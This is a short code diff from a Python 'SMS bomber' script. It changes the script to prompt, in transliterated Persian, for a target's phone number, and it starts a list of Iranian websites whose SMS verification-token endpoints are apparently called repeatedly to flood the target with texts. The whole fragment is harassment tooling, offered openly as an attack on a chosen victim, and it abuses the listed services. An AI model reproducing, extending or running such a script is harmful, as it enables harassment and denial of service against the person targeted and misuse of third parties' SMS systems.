@@ -3,7 +3,8 @@ import time
 
 
 # SMS bomber
-def bomb(number):
+number = input("Shomare Hadaf Vared Konid (without 0) : ")
+
     # Our sites that send SMS
     sites = [
         ["https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
